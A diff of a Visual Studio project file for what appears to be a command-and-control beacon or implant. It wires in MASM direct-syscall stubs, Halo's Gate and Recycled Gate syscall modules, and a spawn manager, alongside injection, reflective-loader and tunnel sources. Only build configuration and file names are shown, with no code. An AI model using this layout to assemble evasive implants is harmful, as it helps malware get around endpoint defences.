@@ -195,7 +195,9 @@
     <GenerateManifest>false</GenerateManifest>
   </PropertyGroup>
   <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
-  <ImportGroup Label="ExtensionSettings" />
+  <ImportGroup Label="ExtensionSettings">
+    <Import Project="$(VCTargetsPath)\BuildCustomizations\masm.props" />
+  </ImportGroup>
   <ImportGroup Label="Shared" />
   <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
     <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
@@ -532,6 +534,12 @@
     <ClCompile Include="src\core\profile.c" />
     <ClCompile Include="src\core\runtime.c" />
     <ClCompile Include="src\core\sleep.c" />
+    <ClCompile Include="src\core\syscall.c" />
+    <ClCompile Include="src\core\syscall\gate_common.c" />
+    <ClCompile Include="src\core\syscall\halos_gate.c" />
+    <ClCompile Include="src\core\syscall\recycled_gate.c" />
+    <ClCompile Include="src\core\syscall\invoke.c" />
+    <ClCompile Include="src\core\syscall\native.c" />
     <ClCompile Include="src\core\sysinfo.c" />
     <ClCompile Include="src\inject\inject.c" />
     <ClCompile Include="src\inject\inject_pe.c" />
@@ -553,6 +561,7 @@
     <ClCompile Include="src\managers\postex_job.c" />
     <ClCompile Include="src\managers\postex_pipe.c" />
     <ClCompile Include="src\managers\postex_request.c" />
+    <ClCompile Include="src\managers\spawn.c" />
     <ClCompile Include="src\managers\tunnel_frame.c" />
     <ClCompile Include="src\managers\tunnel_client.c" />
     <ClCompile Include="src\managers\tunnel_server.c" />
@@ -589,6 +598,9 @@
     <ClInclude Include="include\beacon_reflective_loader.h" />
     <ClInclude Include="include\beacon_runtime.h" />
     <ClInclude Include="include\beacon_sleep.h" />
+    <ClInclude Include="include\beacon_spawn.h" />
+    <ClInclude Include="include\beacon_syscall.h" />
+    <ClInclude Include="include\beacon_syscall_internal.h" />
     <ClInclude Include="include\beacon_sysinfo.h" />
     <ClInclude Include="include\beacon_transfer.h" />
     <ClInclude Include="include\beacon_tunnel.h" />
@@ -597,6 +609,12 @@
     <ClInclude Include="include\beacon.h" />
     <ClInclude Include="include\inject_internal.h" />
   </ItemGroup>
+  <ItemGroup>
+    <!-- 直接 syscall stub（MASM），仅 x64 平台（Win32 构建不 syscall 化） -->
+    <MASM Include="src\syscall\stubs_x64.asm" Condition="'$(Platform)'=='x64'" />
+  </ItemGroup>
   <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
-  <ImportGroup Label="ExtensionTargets" />
+  <ImportGroup Label="ExtensionTargets">
+    <Import Project="$(VCTargetsPath)\BuildCustomizations\masm.targets" />
+  </ImportGroup>
 </Project>
